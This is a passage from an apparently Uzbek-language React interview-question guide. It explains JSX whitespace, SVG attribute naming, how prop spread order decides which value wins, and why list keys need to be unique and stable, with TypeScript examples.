**Comparison: HTML vs JSX:**

| HTML | JSX |
|------|-----|
| Multiple spaces collapsed (browser) | Same |
| `&nbsp;` non-breaking space | `&nbsp;` or `{" "}` |
| Newlines collapsed | Same (boundary trimmed) |
| `<br>` for line break | `<br />` (self-closing) |

**Edge case — sentence with name:**

```tsx
const name = "Ali";

// ❌ Concatenation issue
<p>Hello {name}, welcome!</p>
// "Hello Ali, welcome!" — JSX inserts space between text and {}

// Same with explicit:
<p>Hello{" "}{name}{","}{" "}welcome!</p>
```

</details>

### Edge Cases

- **Comment between expressions**: `<p>{a}{/* */}{b}</p>` — comment is `undefined`, no render. Result: "ab".
- **Empty string vs no expression**: `<p></p>` — no children. `<p>{""}</p>` — empty string children (treated as no render).
- **Tabs in JSX**: `\t` in text — collapsed like spaces (browser HTML rule).
- **CRLF line endings (Windows)**: Treated same as LF (Babel normalizes).

### Follow-up savollar

- "How to render literal newlines?" — `<br />` tag, `pre` element with newlines, or CSS `white-space: pre-wrap`.
- "Why doesn't `{0}` skip but `{false}` skips?" — Design: `0` is data (count, ID), `false` is conditional (no UI).
- "Can I render emoji?" — Ha, `<p>👋 Hello</p>` — emoji is text. Or `{"\u{1F44B}"}` Unicode.

</details>

---

### 47. SVG attributes JSX'da — viewBox, fillOpacity, strokeWidth [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

SVG (Scalable Vector Graphics) JSX'da bevosita ishlaydi. Attribute'lar **camelCase** (HTML'dan farqli — SVG spec kebab-case'da: `viewBox`, `clip-path` → JSX `viewBox`, `clipPath`). React JSX'da SVG namespace avtomatik handle qilinadi (`<svg xmlns>` shart emas embedded'da). Common gotcha: `class` → `className`, `tabindex` → `tabIndex`, lekin `xmlns:xlink` → `xmlnsXlink`.

### To'liq tushuntirish

**SVG attribute conversion table:**

| SVG (HTML) | JSX | Sabab |
|------------|-----|-------|
| `viewBox` | `viewBox` | camelCase saqlanadi |
| `class` | `className` | JS reserved |
| `clip-path` | `clipPath` | kebab → camel |
| `fill-opacity` | `fillOpacity` | kebab → camel |
| `stroke-width` | `strokeWidth` | kebab → camel |
| `stroke-linecap` | `strokeLinecap` | kebab → camel |
| `text-anchor` | `textAnchor` | kebab → camel |
| `font-family` | `fontFamily` | kebab → camel |
| `xmlns:xlink` | `xmlnsXlink` | colon stripped |
| `xlink:href` | `xlinkHref` | colon stripped |
| `tabindex` | `tabIndex` | camelCase |

### Kod misoli

```tsx
function Logo() {
  return (
    <svg
      width="100"
      height="100"
      viewBox="0 0 100 100"
      xmlns="http://www.w3.org/2000/svg"
    >
      <circle
        cx={50}
        cy={50}
        r={40}
        fill="red"
        stroke="black"
        strokeWidth={2}
        fillOpacity={0.5}
      />
      <path
        d="M 10 10 L 90 90"
        stroke="blue"
        strokeWidth={3}
        strokeLinecap="round"
      />
      <text
        x={50}
        y={55}
        textAnchor="middle"
        fontFamily="Arial"
        fontSize={14}
        fill="white"
      >
        Hello
      </text>
    </svg>
  );
}
```

**SVG component — reusable:**

```tsx
interface IconProps {
  size?: number;
  color?: string;
  className?: string;
}

function HeartIcon({ size = 24, color = "red", className }: IconProps) {
  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 24 24"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      className={className}
    >
      <path
        d="M12 21s-7-4.5-9.5-9C0 8 2 4 6 4c2 0 4 2 6 4 2-2 4-4 6-4 4 0 6 4 3.5 8-2.5 4.5-9.5 9-9.5 9z"
        fill={color}
        stroke="black"
        strokeWidth={1}
        strokeLinejoin="round"
      />
    </svg>
  );
}

// Usage
<HeartIcon size={32} color="pink" />
```

<details>
<summary><strong>Deep Dive</strong></summary>

**SVG namespace:**

```tsx
// Standalone SVG file — xmlns required
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  ...
</svg>

// Inline SVG in HTML/JSX — xmlns optional (browser handles)
<svg width="100" height="100">
  ...
</svg>

// SVG with foreignObject (HTML inside SVG)
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100" height="100">
    <div xmlns="http://www.w3.org/1999/xhtml">HTML inside SVG</div>
  </foreignObject>
</svg>
```

**`xmlns:xlink` (legacy):**

```tsx
<svg
  xmlns="http://www.w3.org/2000/svg"
  xmlnsXlink="http://www.w3.org/1999/xlink"
>
  <use xlinkHref="#icon-heart" />
</svg>
```

`xlink:href` — older spec, R19'da hali support. Modern: `<use href="...">` (without xlink).

**Numeric vs string values:**

```tsx
// Both work — JSX accepts number or string
<rect x={10} y={10} width={50} height={30} />
<rect x="10" y="10" width="50" height="30" />

// Percentages — string only
<rect width="100%" height="50%" />

// Negative values
<rect x={-10} y={-5} />
```

**`viewBox` parsing:**

```tsx
// Format: "min-x min-y width height"
<svg viewBox="0 0 100 100">  {/* origin (0,0), 100×100 */}
<svg viewBox="-50 -50 100 100">  {/* origin (-50,-50), 100×100 */}

// Aspect ratio
<svg viewBox="0 0 200 100" preserveAspectRatio="xMidYMid meet">
```

**Animation (SMIL — limited support):**

```tsx
<svg viewBox="0 0 100 100">
  <circle cx={50} cy={50} r={10} fill="red">
    <animate
      attributeName="r"
      from="10"
      to="40"
      dur="2s"
      repeatCount="indefinite"
    />
  </circle>
</svg>
```

CSS animation often preferred over SMIL.

**SVG defs + use:**

```tsx
<svg style={{ display: "none" }}>
  <defs>
    <symbol id="icon-heart" viewBox="0 0 24 24">
      <path d="M12 21s..." />
    </symbol>
  </defs>
</svg>

// Reuse
<svg width={24} height={24}><use href="#icon-heart" /></svg>
<svg width={48} height={48}><use href="#icon-heart" /></svg>
```

**Gradient:**

```tsx
<svg width="100" height="100">
  <defs>
    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="0%">
      <stop offset="0%" stopColor="red" stopOpacity={1} />
      <stop offset="100%" stopColor="blue" stopOpacity={0.5} />
    </linearGradient>
  </defs>
  <rect width="100" height="100" fill="url(#grad1)" />
</svg>
```

`stop-color` → `stopColor`, `stop-opacity` → `stopOpacity`.

**Mask + clip-path:**

```tsx
<svg width="100" height="100">
  <defs>
    <clipPath id="circleClip">
      <circle cx={50} cy={50} r={40} />
    </clipPath>
  </defs>
  <image
    href="/photo.jpg"
    width="100"
    height="100"
    clipPath="url(#circleClip)"
  />
</svg>
```

**TypeScript SVG props:**

```typescript
import type { SVGAttributes } from "react";

interface IconProps extends SVGAttributes<SVGSVGElement> {
  size?: number;
}

function MyIcon({ size = 24, ...rest }: IconProps) {
  return (
    <svg width={size} height={size} {...rest}>
      ...
    </svg>
  );
}
```

`SVGAttributes<SVGSVGElement>` — root svg element. `SVGAttributes<SVGCircleElement>` — circle, etc.

**`React.SVGProps`:**

```typescript
type CircleProps = React.SVGProps<SVGCircleElement>;
type PathProps = React.SVGProps<SVGPathElement>;
type SVGProps = React.SVGProps<SVGSVGElement>;
```

**Inline SVG vs `<img src="*.svg">`:**

```tsx
// Inline — JSX, dynamic styling
<svg viewBox="0 0 24 24">
  <path fill={color} d="..." />
</svg>

// Image tag — static, smaller render cost
<img src="/icon.svg" alt="Icon" width={24} height={24} />

// SVG sprite — single file, multiple icons
<svg width={24} height={24}>
  <use href="/sprite.svg#icon-heart" />
</svg>
```

**SVG accessibility:**

```tsx
<svg
  width={24}
  height={24}
  viewBox="0 0 24 24"
  role="img"
  aria-label="Heart icon"
>
  <title>Heart</title>  {/* tooltip + screen reader */}
  <desc>A red heart shape</desc>
  <path d="..." />
</svg>

// Decorative SVG (skip from screen readers)
<svg aria-hidden="true">...</svg>
```

</details>

### Edge Cases

- **`<image>` (SVG) vs `<img>` (HTML)**: `<image>` is SVG element with `href`/`xlinkHref`. `<img>` is HTML.
- **`href` modern vs `xlink:href` legacy**: SVG2 — `href` direct. R19 supports both.
- **`<style>` inside SVG**: CSS scoped. `<style>{`circle { fill: red }`}</style>`.
- **Foreign object — HTML inside SVG**: `<foreignObject>` with `xmlns="http://www.w3.org/1999/xhtml"`.

### Follow-up savollar

- "Why is SVG kebab-case in spec but camelCase in JSX?" — JSX camelCase convention (matches HTML attribute conversion). Babel handles transform.
- "Can I import SVG as React component?" — Ha, with bundler config (SVGR — Vite/Webpack plugin). `import { ReactComponent as Icon } from './icon.svg'`.
- "SVG performance vs canvas?" — SVG declarative, scalable. Canvas imperative, faster for large dynamic scenes (animations).

</details>

---

### 48. Output: spread order — `<button {...rest} onClick={x} />` vs `<button onClick={x} {...rest} />` [Output] [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Savol

Quyidagi 2 ta komponent click qilinganda nima output qiladi?

```tsx
const rest = {
  onClick: () => console.log("rest onClick"),
  className: "rest-class",
};

function A() {
  return (
    <button
      onClick={() => console.log("explicit onClick")}
      {...rest}
    >
      A — explicit FIRST
    </button>
  );
}

function B() {
  return (
    <button
      {...rest}
      onClick={() => console.log("explicit onClick")}
    >
      B — explicit LAST
    </button>
  );
}
```

### Javob

| Komponent | Click output |
|-----------|--------------|
| **A** (explicit first, spread last) | `"rest onClick"` |
| **B** (spread first, explicit last) | `"explicit onClick"` |

**Tushuntirish:**

JSX spread order — JS object spread bilan bir xil. Keyingi property avvalgisini override qiladi.

```tsx
// A: explicit first, spread last
const propsA = { onClick: explicitFn, ...rest };
// = { onClick: explicitFn, onClick: restFn, className: "rest-class" }
// = { onClick: restFn, className: "rest-class" }   ← rest's onClick wins

// B: spread first, explicit last
const propsB = { ...rest, onClick: explicitFn };
// = { onClick: restFn, className: "rest-class", onClick: explicitFn }
// = { onClick: explicitFn, className: "rest-class" }  ← explicit wins
```

### Kod misoli

**Anti-pattern (A) — wrapper bypass:**

```tsx
// ❌ Wrapper component — explicit handler ignored
function StyledButton(props: React.ButtonHTMLAttributes<HTMLButtonElement>) {
  return (
    <button
      onClick={() => console.log("default click")}
      className="styled"
      {...props}  // ← user's onClick overrides
    />
  );
}

<StyledButton onClick={() => console.log("user click")}>Click</StyledButton>
// Output: "user click" — default click ignored
```

**Best practice (B) — spread first, override:**

```tsx
// ✅ Wrapper — explicit defaults, spread allows override
function StyledButton(props: React.ButtonHTMLAttributes<HTMLButtonElement>) {
  return (
    <button
      {...props}
      className={`styled ${props.className ?? ""}`}  // ← compose
      onClick={(e) => {
        props.onClick?.(e);  // ← chain user handler
        console.log("default click");
      }}
    />
  );
}

<StyledButton onClick={() => console.log("user click")}>Click</StyledButton>
// Output: "user click", "default click"
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Compile output:**

```tsx
// JSX
<button onClick={explicitFn} {...rest} />

// Compiled
_jsx("button", { onClick: explicitFn, ...rest });

// JS object — last wins
{ onClick: explicitFn, ...rest } === { ...rest }  // explicitFn overridden
```

**Spread + key/ref special handling:**

```tsx
// key — extracted before spread (special)
<Item key={item.id} {...item.props} />
// Equivalent: key={item.id} props={item.props}, key NOT in props

// ref (R19) — props-like, spread can override
<Component ref={myRef} {...props} />  // ref in props.ref
```

**Multi-spread:**

```tsx
const a = { color: "red", size: 10 };
const b = { color: "blue", border: "1px" };

<div {...a} {...b} />
// Compiled: _jsx("div", { ...a, ...b })
// Result: { color: "blue", size: 10, border: "1px" }   ← b overrides
```

**Spread with explicit before:**

```tsx
<div className="base" {...rest} className="override" />
// Compiled: _jsx("div", { className: "base", ...rest, className: "override" })
// Result: { className: "override", ...rest spread, then className "override" again }
// Note: same key 2 times in object literal — last wins ("override")
```

**Combining handlers:**

```tsx
// Pattern: chain user handler with own
function Wrapper(props: { onClick?: (e: MouseEvent) => void }) {
  const ownHandler = (e: MouseEvent) => {
    console.log("wrapper click");
  };

  return (
    <button
      {...props}
      onClick={(e) => {
        ownHandler(e);
        props.onClick?.(e);  // chain user
      }}
    />
  );
}
```

**Class composition:**

```tsx
// ❌ Override
function Card({ className, ...rest }: { className?: string }) {
  return <div className="card" {...rest} />;  // user className overrides "card"
}

// ✅ Compose
function Card({ className, ...rest }: { className?: string }) {
  return <div className={`card ${className ?? ""}`} {...rest} />;
}

// Or with classnames library
import clsx from "clsx";
function Card({ className, ...rest }: { className?: string }) {
  return <div className={clsx("card", className)} {...rest} />;
}
```

**TypeScript safety:**

```tsx
// TypeScript checks spread types
interface ButtonProps {
  variant: "primary" | "secondary";
  onClick: () => void;
}

const handler = () => console.log("click");
const props: ButtonProps = { variant: "primary", onClick: handler };

<button {...props} />  // ✅ TypeScript validates props
<button {...props} onClick={"not a function"} />  // ❌ TypeScript error
```

**Spread `null` / `undefined`:**

```tsx
const props = null;
<button {...props} />  // OK — JS spread null is no-op

const props = undefined;
<button {...props} />  // OK — same

// ❌ Spread non-object
<button {...123} />  // SyntaxError or TypeError
<button {...{}} />  // OK — empty object
```

**Spread with conditional:**

```tsx
<button {...(isDisabled && { disabled: true })} />
// If isDisabled: { disabled: true } spread
// Else: false spread (no-op)

<button
  {...(isDisabled
    ? { disabled: true, "aria-disabled": "true" }
    : {})}
/>
```

**Real-world wrapper pattern:**

```tsx
const Button = forwardRef<HTMLButtonElement, ButtonProps>(
  function Button({ variant = "primary", className, onClick, children, ...rest }, ref) {
    return (
      <button
        ref={ref}
        type="button"
        className={`btn btn-${variant} ${className ?? ""}`}
        onClick={(e) => {
          // Custom logic before user handler
          analytics.track("button_click", { variant });
          onClick?.(e);
        }}
        {...rest}
      >
        {children}
      </button>
    );
  }
);
```

</details>

### Edge Cases

- **Spread same key twice**: `<div className="a" {...{className: "b"}} className="c" />` → "c" wins (last).
- **Spread `Symbol.iterator`**: Spread spreads enumerable own properties. Symbol keys ignored in JSX context.
- **`key` not in spread props**: `<Item key={1} {...{key: 2}} />` — `key={1}` wins (key extracted separately).
- **Spread function**: `<button {...handlerObj} />` — spreads function's properties (e.g., `bind`, `name`), not call function. Useless.

### Follow-up savollar

- "Best practice for wrapper components?" — Spread early, override late (compose). User props can be customized; wrapper has final say on critical props (like `type="button"`).
- "Performance impact of spread?" — Minor — creates new object each render. With many props/often-rendered, prefer explicit. React Compiler optimizes.
- "ESLint rule for spread order?" — `react/jsx-props-no-spreading` (controversial — disable for wrappers).

</details>

---

## QISM D: List Rendering va Keys

### 49. `key` prop nima uchun kerak? Reconciler'dagi roli [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**`key`** — list'da har element uchun unique identifier. Reconciliation paytida React `key` orqali element identity'ni saqlaydi: bir xil `key` — bir xil komponent (state preserve), boshqa `key` — yangi instance (state reset, mount/unmount). Without `key` — React index-based fallback ishlatadi (insertion/reorder bug'lariga olib keladi).

### To'liq tushuntirish

**Key'ning roli:**

1. **Element identity** — qaysi element qaysi Fiber'ga mos keladi
2. **Optimal diff** — insertion/deletion'da minimal DOM operatsiyalar
3. **State preservation** — komponent state (input value, scroll, hooks) saqlanadi
4. **Animation** — Framer Motion / React Transition Group correctness

**Key qoidalari:**

- ✅ **Unique** — bitta list ichida unique (sibling'lar orasida)
- ✅ **Stable** — har render'da bir xil item uchun bir xil key
- ✅ **Predictable** — random emas (`Math.random()` BAD)
- ⚠️ **Index OK** faqat: static list, no reorder, no insert/delete

### Kod misoli

```tsx
interface User { id: string; name: string }

// ✅ ID-based key (best)
function UserList({ users }: { users: User[] }) {
  return (
    <ul>
      {users.map((user) => (
        <li key={user.id}>{user.name}</li>
      ))}
    </ul>
  );
}

// ❌ Index as key (anti-pattern for dynamic lists)
function BadList({ items }: { items: string[] }) {
  return (
    <ul>
      {items.map((item, i) => (
        <li key={i}>{item}</li>
      ))}
    </ul>
  );
}
// Reorder/insert bug: input state items'ga "yopishadi"

// ❌ Random key (creates new fiber every render)
function VeryBadList({ items }: { items: string[] }) {
  return items.map((item) => <div key={Math.random()}>{item}</div>);
  // ⚠️ Har render — yangi fiber, full unmount/remount, state lost
}

// ✅ Composite key (no unique ID)
function CompositeKey({ items }: { items: { name: string; date: string }[] }) {
  return items.map((item) => (
    <div key={`${item.name}-${item.date}`}>{item.name}</div>
  ));
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Reconciliation algorithm with keys:**

```typescript
// Old children (existing fiber list)
[Fiber({ key: "a" }), Fiber({ key: "b" }), Fiber({ key: "c" })]

// New children (from new render)
[Element({ key: "a" }), Element({ key: "c" }), Element({ key: "b" })]

// Reconciler algoritmi:
// 1. First pass — match by index until mismatch
// 2. On mismatch — build map of remaining old by key
// 3. For each new element — lookup in map by key
// 4. Match found — reuse fiber (move position)
// 5. No match — create new fiber
// 6. Old fibers without match — mark for deletion
```

**Without keys (index-based):**

```typescript
// New children — no key
[Element({}), Element({}), Element({})]

// Reconciler — index-based:
// new[0] → old[0]
// new[1] → old[1]
// new[2] → old[2]

// Reorder problem:
// Old: [<Input value="A">, <Input value="B">, <Input value="C">]
// User reorders to: [B, A, C] visually
// Without keys: [<Input value="A">, <Input value="B">, <Input value="C">]
//                ↑ same fibers, only props change!
//                Input state — A's input still has A's typed value
```

**Index as key — same problem:**

```tsx
// items = ["A", "B", "C"]
{items.map((item, i) => <Input key={i} defaultValue={item} />)}

// User typed in Input(A): "Hello"
// Reorder to ["B", "A", "C"]
// items.map produces: <Input key={0} defaultValue="B" /> ← old key 0 was A's input
// Input keeps "Hello" but now shows "B"!
```

**Key change — full unmount/mount:**

```tsx
function ResettableForm() {
  const [resetCount, setResetCount] = useState(0);

  return (
    <>
      <button onClick={() => setResetCount((c) => c + 1)}>Reset</button>
      <Form key={resetCount} />  {/* key change → full re-mount, state reset */}
    </>
  );
}
```

**Key + Fragment:**

```tsx
{items.map((item) => (
  <Fragment key={item.id}>
    <dt>{item.term}</dt>
    <dd>{item.definition}</dd>
  </Fragment>
))}
// Fragment shorthand <>...</> qabul qilmaydi key — Fragment explicit kerak
```

**Key — global emas, scoped:**

Key faqat **siblings** orasida unique. Different list — same key OK:

```tsx
<div>
  <UserList>{users.map(u => <User key={u.id} />)}</UserList>
  <ProductList>{products.map(p => <Product key={p.id} />)}</ProductList>
  {/* user.id va product.id bir xil bo'lishi mumkin — alohida list */}
</div>
```

**Key warnings:**

```
Warning: Each child in a list should have a unique "key" prop.
```

ESLint:
```json
{
  "rules": {
    "react/jsx-key": "error"
  }
}
```

**Key for non-array siblings — kerak emas:**

```tsx
// Conditional render — key kerak emas (siblings static)
<>
  {showA && <A />}
  {showB && <B />}
</>
```

**Key with `cloneElement`:**

```tsx
React.Children.map(children, (child, i) =>
  React.cloneElement(child, { key: i })
);
// ⚠️ Index ko'p hollarda OK chunki Children.map static
```

**Key in SSR:**

Key — server va client'da bir xil bo'lishi shart. Random key (`Math.random()`) hydration mismatch.

```tsx
// ❌ SSR mismatch
{items.map(() => <li key={Math.random()}>...</li>)}

// ✅ Stable key
{items.map((item) => <li key={item.id}>...</li>)}
```

</details>

### Edge Cases

- **Duplicate keys**: Warning, lekin kod ishlaydi (random behavior — Reconciler ikki sibling'ga bir xil match bo'lishi mumkin).
- **Key change on reorder**: Bu **kutilgan** behavior — same item, same key.
- **No key on map**: Warning + index fallback (suboptimal performance).

### Follow-up savollar

- "`key={Date.now()}` qanday yomon?" — Random emas, lekin har render yangi value — har gal full unmount/remount, state lost.
- "Server-rendered list key strategy?" — DB ID ishlatish (stable across server/client).
- "Composite key safe-mi?" — Faqat composite combination unique bo'lsa. `${name}-${date}` ishlatish nameuniqueness'ga bog'liq.

</details>

---

### 50. Index as key qachon xato? Reordering bug [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**Index as key** quyidagi holatlarda **xato**: (1) **insert/delete** middle'da, (2) **reorder** (drag-drop, sort), (3) **list filtering**, (4) **stateful child** (input, animation, scroll position). Index — list pozitsiyasiga bog'liq, item identity'siga emas. State pozitsiyaga "yopishadi", item'larga emas.

### To'liq tushuntirish

**Index OK qachon:**

- Static list — hech qachon o'zgarmaydi
- No insert/delete middle
- No reorder
- Stateless children (faqat display)
- Backup choice — ID yo'q bo'lsa va boshqa unique narsa yo'q

**Index XATO qachon:**

- Dynamic list (insert/delete/reorder)
- Stateful children (`<input>`, `<select>`, animation, scroll)
- Filtering / search
- Sort
- Pagination (item position changes)

### Kod misoli

**❌ Bug demo — input state to'g'ri item'da emas:**

```tsx
function TodoListBuggy() {
  const [todos, setTodos] = useState([
    { text: "Buy milk" },
    { text: "Read book" },
    { text: "Cook dinner" },
  ]);

  const addToFront = () => {
    setTodos([{ text: "Wake up" }, ...todos]);
  };

  return (
    <div>
      <button onClick={addToFront}>Add to front</button>
      <ul>
        {todos.map((todo, i) => (
          <li key={i}>  {/* ❌ Index */}
            <input defaultValue={todo.text} />
          </li>
        ))}
      </ul>
    </div>
  );
}

// Initial:
//   [0] <input value="Buy milk">    ← user types "Buy bread"
//   [1] <input value="Read book">
//   [2] <input value="Cook dinner">

// After "Add to front" click:
//   [0] <input value="Wake up">     ← key=0 — same fiber, BUT defaultValue ignored on update
//   [1] <input value="Buy bread">   ← key=1 — same fiber, "Buy bread" stayed!
//   [2] <input value="Read book">   ← key=2 — same fiber
//   [3] <input value="Cook dinner"> ← new fiber, fresh defaultValue
//
// User confused: typed in "Buy milk" but it shows on "Read book"
```

**✅ Fix — stable ID:**

```tsx
function TodoListGood() {
  const [todos, setTodos] = useState([
    { id: "1", text: "Buy milk" },
    { id: "2", text: "Read book" },
    { id: "3", text: "Cook dinner" },
  ]);

  const addToFront = () => {
    const newTodo = { id: crypto.randomUUID(), text: "Wake up" };
    setTodos([newTodo, ...todos]);
  };

  return (
    <ul>
      {todos.map((todo) => (
        <li key={todo.id}>  {/* ✅ Stable ID */}
          <input defaultValue={todo.text} />
        </li>
      ))}
    </ul>
  );
}

// After "Add to front":
//   [new] <input value="Wake up">       ← new fiber, fresh
//   [1]   <input value="Buy bread">     ← old fiber, kept user's input
//   [2]   <input value="Read book">
//   [3]   <input value="Cook dinner">
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Reconciliation diff — index based:**

```typescript
// Old: [Item0("A"), Item1("B"), Item2("C")]
// New: [Item0("X"), Item1("A"), Item2("B"), Item3("C")]
//      ↑ "X" inserted to front

// With key={i}:
// Old keys: [0, 1, 2]
// New keys: [0, 1, 2, 3]

// Reconciler:
// new[0] (key=0, "X") ← matches old[0] (key=0, "A")
//   → SAME FIBER, props update: A → X
// new[1] (key=1, "A") ← matches old[1] (key=1, "B")
//   → SAME FIBER, props update: B → A
// new[2] (key=2, "B") ← matches old[2] (key=2, "C")
//   → SAME FIBER, props update: C → B
// new[3] (key=3, "C") ← no old match
//   → NEW FIBER created

// Result: 3 fibers got props update, 1 new fiber created
// But: each existing fiber now has wrong content (state mismatch)
```

**Reconciliation with stable ID:**

```typescript
// Old: [Item("A", id="A"), Item("B", id="B"), Item("C", id="C")]
// New: [Item("X", id="X"), Item("A", id="A"), Item("B", id="B"), Item("C", id="C")]

// Reconciler:
// new[0] (key="X") ← no match in old
//   → NEW FIBER for X
// new[1] (key="A") ← matches old[0] (key="A")
//   → SAME FIBER moved from index 0 to 1
// new[2] (key="B") ← matches old[1] (key="B")
//   → SAME FIBER moved
// new[3] (key="C") ← matches old[2] (key="C")
//   → SAME FIBER moved

// Result: 1 new fiber, 3 fibers moved (state preserved)
```

**State pollution scenarios:**

```tsx
// 1. Input value
<input defaultValue={item.text} key={i} />
// User types in item[0], reorder, value sticks to position

// 2. Animation state
<motion.div animate={...} key={i} />
// Animation continues from "wrong" item

// 3. Scroll position
<ScrollableList key={i} />
// Scroll position attached to position, not item

// 4. Hook state
function ItemRow({ item }: { item: Item }) {
  const [expanded, setExpanded] = useState(false);
  return <div onClick={() => setExpanded(!expanded)}>{item.name}</div>;
}
{items.map((item, i) => <ItemRow key={i} item={item} />)}
// Expanded state attached to position
```

**When index is safe:**

```tsx
// ✅ Safe — static list, no state, no reorder
const SOCIAL_LINKS = ["Twitter", "GitHub", "LinkedIn"];

function Footer() {
  return (
    <ul>
      {SOCIAL_LINKS.map((link, i) => (
        <li key={i}>
          <a href={`/${link.toLowerCase()}`}>{link}</a>
        </li>
      ))}
    </ul>
  );
}

// ✅ Safe — stateless child, append-only list
const messages = useMessages();
{messages.map((msg, i) => <Message key={i} message={msg} />)}
// New messages appended at end, no reorder
```

**Hybrid: append-only safe, but reorder breaks:**

```tsx
const [logs, setLogs] = useState<string[]>([]);

useEffect(() => {
  const id = setInterval(() => {
    setLogs((prev) => [...prev, `Log at ${Date.now()}`]);  // append-only
  }, 1000);
  return () => clearInterval(id);
}, []);

return logs.map((log, i) => <p key={i}>{log}</p>);  // OK
```

Lekin agar hech qachon `logs.reverse()` qilinsa — bug. Stable ID safer.

**Generating IDs:**

```typescript
// 1. Backend ID (best)
const items = await fetch("/api/items").then(r => r.json());
// items: [{ id: "uuid-1", ... }]

// 2. Crypto random (frontend-only data)
const id = crypto.randomUUID();

// 3. Counter
let counter = 0;
const newItem = { id: ++counter, ... };

// 4. Library
import { nanoid } from "nanoid";
const id = nanoid();
```

</details>

### Edge Cases

- **`key={item.text}` if texts unique**: OK, agar text doim unique va stable bo'lsa. User typing — text o'zgaradi → key o'zgaradi → unmount/remount.
- **`key={...}` with object reference**: `key={item}` — JS object → string conversion `[object Object]` (collision).
- **Negative index**: `items.length - 1 - i` — ishlaydi, lekin still index-based bug.

### Follow-up savollar

- "ID yo'q backend list — qanday qilish?" — Frontend'da `crypto.randomUUID()` mount paytida. State'da saqlash kerak (har render'da yangi UUID — random key bug).
- "DnD library bilan qanday key strategy?" — Stable ID majburiy. react-beautiful-dnd, dnd-kit hammasi item ID kutadi.
- "TypeScript bilan key tip?" — `string | number`. `null`/`undefined` — warning (no key).

</details>

---

### 51. Key rules — unique, stable, predictable. Random key nima uchun yomon? [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

Key 3 ta majburiy xususiyatga ega bo'lishi shart: (1) **Unique** — sibling'lar orasida — duplicate'lar warning + buggy reconciliation, (2) **Stable** — har render'da same item uchun same key — Reconciler bilan bog'lash uchun, (3) **Predictable** — `Math.random()` yoki `Date.now()` — har render yangi key — full unmount/remount, state lost, performance penalty.

### To'liq tushuntirish

**Key xususiyatlari:**

| Xususiyat | Misol (yaxshi) | Misol (yomon) |
|-----------|----------------|----------------|
| Unique | `user.id` (DB UUID) | Bo'sh ID, takrorlanuvchi |
| Stable | `user.id` (mount → unmount) | `Math.random()` (har render) |
| Predictable | `user.id` (deterministik) | `crypto.randomUUID()` render'da |
| Scoped | sibling'lar orasida unique | Global UUID kerak emas |

### Kod misoli

**✅ Yaxshi key sources:**

```tsx
// 1. Database ID (best)
{users.map((u) => <UserCard key={u.id} user={u} />)}

// 2. UUID generated on creation (frontend-only data)
const [items, setItems] = useState<Item[]>([
  { id: crypto.randomUUID(), text: "First" }
]);
{items.map((item) => <Item key={item.id} item={item} />)}

// 3. Composite key (no single unique field)
{messages.map((msg) => (
  <Message key={`${msg.userId}-${msg.timestamp}`} message={msg} />
))}

// 4. Slug / URL-safe identifier
{posts.map((post) => <Post key={post.slug} post={post} />)}
```

**❌ Yomon key examples:**

```tsx
// 1. Random — har render yangi key
{items.map((item) => <Item key={Math.random()} item={item} />)}
// Effect: full unmount/remount every render, state lost, performance dead

// 2. Date.now() — yangi value har render
{items.map((item) => <Item key={Date.now()} item={item} />)}
// Same as random — broken

// 3. Crypto random in render
{items.map((item) => <Item key={crypto.randomUUID()} item={item} />)}
// Same as Math.random() — generated each render

// 4. Index when items reorder
{items.map((item, i) => <Item key={i} item={item} />)}
// Bug-prone for dynamic lists

// 5. Object reference
{items.map((item) => <Item key={item} item={item} />)}
// Object → "[object Object]" — all collisions
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Random key — performance impact:**

```tsx
// ❌ Anti-pattern
function List({ items }: { items: Item[] }) {
  return items.map((item) => (
    <ExpensiveComponent key={Math.random()} item={item} />
  ));
}

// Reconciliation:
// Render 1: keys = [0.123, 0.456, 0.789]
// Render 2: keys = [0.111, 0.222, 0.333]  ← all different
// Reconciler: no matches found → unmount all old, mount all new

// Effect:
// 1. Full DOM teardown
// 2. Hooks state reset
// 3. Effects cleanup + re-run
// 4. CSS transitions disrupted
// 5. Animation frames lost
// 6. Performance: O(n) full mount cycle every render
```

**Stable key — preserves identity:**

```tsx
function StableList({ items }: { items: Item[] }) {
  return items.map((item) => <Component key={item.id} item={item} />);
}

// Render 1: keys = ["uuid-1", "uuid-2", "uuid-3"]
// Render 2: keys = ["uuid-1", "uuid-2", "uuid-3"]  ← same
// Reconciler: 1:1 match → fibers preserved, only props update
```

**`useMemo` with stable IDs:**

```tsx
function List() {
  const items = useMemo(() => {
    return data.map((d) => ({ id: crypto.randomUUID(), ...d }));
  }, [data]);  // ID generated once per data change

  return items.map((item) => <Component key={item.id} item={item} />);
}
```

**Counter approach (referential stability):**

```tsx
function CounterIDList() {
  const [items, setItems] = useState<Item[]>([]);
  const counterRef = useRef(0);

  const addItem = (text: string) => {
    setItems((prev) => [
      ...prev,
      { id: ++counterRef.current, text }
    ]);
  };

  return items.map((item) => <Item key={item.id} item={item} />);
}
```

**Hash-based key (semantic identity):**

```tsx
function MessagesList({ messages }: { messages: Message[] }) {
  return messages.map((msg) => (
    <MessageView
      key={hash(msg)}  // hash of content + author + timestamp
      message={msg}
    />
  ));
}
// ⚠️ Beware: same content = same key (duplicate messages collapse)
```

**Key uniqueness scope:**

```tsx
// ✅ Sibling-level uniqueness (within same array)
<div>
  {users.map((u) => <User key={u.id} />)}
  {products.map((p) => <Product key={p.id} />)}
</div>
// users[0].id can equal products[0].id (different arrays)

// ❌ Mixing in same array
<div>
  {[...users, ...products].map((item) => <Card key={item.id} item={item} />)}
</div>
// If user.id collides with product.id — bug!
// Fix: prefix
{[...users, ...products].map((item) => (
  <Card key={`${item.type}-${item.id}`} item={item} />
))}
```

**TypeScript key type:**

```typescript
// React.Key
type Key = string | number | bigint;
// null/undefined — no key (warning)
// Object — toString conversion (collision)
```

**SSR + key:**

